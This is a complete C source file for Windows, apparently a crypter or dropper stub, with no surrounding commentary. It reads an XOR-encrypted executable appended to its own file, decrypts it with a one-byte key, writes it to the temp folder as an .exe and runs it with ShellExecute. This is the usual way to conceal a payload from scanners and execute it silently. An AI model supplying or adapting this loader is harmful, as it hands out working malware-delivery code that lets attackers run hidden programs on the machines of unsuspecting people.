#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void xor_decrypt(unsigned char *data, long size, char key) {
    for (long i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int main() {
    char key = 'k'; // Example key, use the same key as in the encryption step

    // Open the current executable
    FILE *self = fopen(__argv[0], "rb");
    if (!self) {
        perror("Failed to open self executable");
        return EXIT_FAILURE;
    }

    // Find the size of the executable
    fseek(self, 0, SEEK_END);
    long self_size = ftell(self);
    fseek(self, 0, SEEK_SET);

    // Find the size of the payload
    fseek(self, -4, SEEK_END);
    long payload_size;
    fread(&payload_size, sizeof(long), 1, self);

    // Read the encrypted payload
    fseek(self, self_size - 4 - payload_size, SEEK_SET);
    unsigned char *payload = (unsigned char *)malloc(payload_size);
    if (!payload) {
        perror("Memory allocation failed");
        fclose(self);
        return EXIT_FAILURE;
    }
    fread(payload, 1, payload_size, self);
    fclose(self);

    // Decrypt the payload
    xor_decrypt(payload, payload_size, key);

    // Write the decrypted payload to a temporary file
    char temp_path[MAX_PATH];
    GetTempPath(MAX_PATH, temp_path);
    strcat(temp_path, "decrypted_payload.exe");

    FILE *temp_file = fopen(temp_path, "wb");
    if (!temp_file) {
        perror("Failed to open temporary file");
        free(payload);
        return EXIT_FAILURE;
    }
    fwrite(payload, 1, payload_size, temp_file);
    fclose(temp_file);
    free(payload);

    // Execute the decrypted payload
    ShellExecute(NULL, "open", temp_path, NULL, NULL, SW_SHOW);

    return EXIT_SUCCESS;
}
